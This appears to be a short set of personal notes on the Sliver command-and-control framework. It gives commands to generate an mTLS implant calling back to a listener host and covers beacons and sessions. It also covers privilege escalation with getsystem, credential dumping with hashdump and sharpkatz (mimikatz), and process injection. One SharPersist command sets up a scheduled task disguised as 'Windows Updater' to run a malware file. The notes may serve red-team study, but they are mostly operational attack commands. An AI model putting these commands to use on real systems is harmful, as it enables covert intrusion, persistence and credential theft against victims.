# Sliver
## Generating Binaries
* Generate an Implant (mtls, http, dns), this will generate a file saved at the location specified generate Generate a sliver binary
```
generate --mtls 192.168.0.21 --save ./file.exe --os Windows
```
* Start a listener
	* http Start an HTTP listener
	* https Start an HTTPS listener
	* dns Start a DNS listener
	* mtls Start an mTLS listener
* `jobs` shows the listeners
## Beacons
* periodically checks in with the server
	* used when trying to not be as noisy as a session
* kill all beacons with `beacons -k`
* to move from a beacon to a session, use the beacon and then use the command `interactive`

## Sessions
* essentially a shell
* If you land on a local-admin account use the `getsystem` to get a session
* `background` can background a session
* `hashdump` command from the armory pulls the local creds
* to kill a session run `session -k` followed by the session id

## The Armory
* Install all of the armory tools with `armory install all`
* if it starts with "sa" gets info on box
*  Sharpersit
```
sharpersist -- -t schtask -c "C:\Windows\Tasks\malwarefile.exe" -n "Windows Updater" -m add
```
* breaking down the command
	* -- sends arguments to program you are running instead of sliver
	* -t is type of persistence
	* -c is the type of command you want to run
	* -n is the name
	* -m updater

## Other Sliver Notes
* execute assembly
	* will take compiled program on your laptop and inject
* `sharpkatz` is mimikatz, should already be loaded in
* `secinject` section mapping process injection